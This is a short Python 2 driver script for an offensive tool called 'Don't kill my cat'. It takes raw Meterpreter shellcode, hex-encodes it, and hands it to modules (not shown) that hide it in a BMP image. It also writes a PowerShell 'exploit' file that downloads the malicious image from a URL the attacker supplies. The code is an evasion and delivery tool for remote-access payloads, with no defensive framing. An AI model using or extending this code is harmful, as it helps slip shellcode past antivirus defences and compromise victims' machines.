#!/usr/bin/env python2
import os
import re
import argparse as ap
import module.gen
import module.ps

def get_raw_shellcode(shellcode_path):
    shellcode = ""
    if os.path.exists(shellcode_path):
        shellcode =  "\\x" + "\\x".join(re.findall("..", open(shellcode_path, "rb").read().encode("hex")))
    else:
        print "%s not found" % shellcode_path
    return shellcode

if __name__ == "__main__":
    parser = ap.ArgumentParser(description='Don\'t kill my cat - one liner version.')
    parser.add_argument('-s', '--shellcode', required=True, help="The path to the raw shellcode file from Meterpreter")
    parser.add_argument('-o', '--output', required=False, default="out.bmp", help="The name for the outputted bitmap image")
    parser.add_argument('-p', '--powershell', required=False, default="exploit.ps", help="The name for the outputted powershell file")
    parser.add_argument('-u', '--url', required=True, help="The URL that powershell will attempt to access the malicious .bmp from.")
    parser.add_argument('-i', '--image', required=False, default="sample/default.bmp", help="The path to the .bmp that you wish to embed the shellcode in.")

    args = parser.parse_args()
    shellcode = get_raw_shellcode(args.shellcode)
    if shellcode != "":
        if module.gen.generate_shellcode(shellcode, args.output, args.image):
            module.ps.generate_powershell(args.powershell, args.url)
    
